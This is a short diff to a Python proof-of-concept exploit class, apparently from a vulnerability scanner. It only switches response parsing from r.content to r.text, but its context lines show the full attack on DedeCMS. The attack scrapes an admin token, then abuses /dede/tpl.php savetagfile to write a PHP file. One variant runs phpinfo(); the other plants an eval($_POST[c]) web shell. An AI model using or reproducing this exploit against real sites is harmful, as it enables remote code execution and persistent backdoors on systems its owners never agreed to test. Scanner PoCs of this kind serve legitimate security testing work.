@@ -55,8 +55,8 @@ class Poc(ABPoc):
             # 获取token
             p = re.compile(
                 r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
-            if p.findall(r.content):
-                token = p.findall(r.content)[0]
+            if p.findall(r.text):
+                token = p.findall(r.text)[0]
 
                 s.get(
                     self.target + '/dede/tpl.php?filename=cscan.lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token={token}'.format(token=token))
@@ -82,8 +82,8 @@ class Poc(ABPoc):
             # 获取token
             p = re.compile(
                 r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
-            if p.findall(r.content):
-                token = p.findall(r.content)[0]
+            if p.findall(r.text):
+                token = p.findall(r.text)[0]
 
                 s.get(
                     self.target + '/dede/tpl.php?filename=cscan.lib.php&action=savetagfile&content=%3C?php%20phpinfo();eval($_POST[c]);?%3E&token={token}'.format(token=token))
